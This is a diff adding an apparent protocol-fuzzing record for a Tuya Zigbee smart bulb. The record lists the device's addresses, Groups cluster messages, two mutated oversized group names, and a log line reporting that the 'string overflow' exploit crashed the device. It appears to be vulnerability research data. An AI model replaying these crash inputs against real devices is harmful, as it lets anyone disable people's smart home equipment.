@@ -1,0 +1,39 @@
+Timestamp:
+  - "20240708_17:45:12:903"
+Device:
+  - "Tuya Smart Bulb"
+IEEE:
+  - "a4:c1:38:ba:81:3f:fc:88"
+Nwk_Address:
+  - "0x4BAB"
+State:
+  - "Any"
+Message_Relationship:
+  - "Correlation"
+Fuzzing_Messages:
+  - {
+    "groups_add": {
+      "id": 0,
+      "direction_header": 0,
+      "group_id": "t.Group",
+      "group_name": "t.LimitedCharString(16)"
+    },
+    "groups_get_membership": {
+      "id": 2,
+      "direction_header": 0,
+      "groups": {
+        "t.LVList": "t.Group"
+      }
+    }
+  }
+Mutation_Strategy:
+  - T-1-2
+  - "groups_add"
+  - {
+      "group_name": "!@#$%^&*!@#$%^&*!@"
+  }
+  - {
+      "group_name": "\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup"
+  }
+Log:
+  - "[Device 4] Exploit: AddGroup, GetGroupMembership | Mutation: 'group_name': String overflow | Result: Device Crashed |"
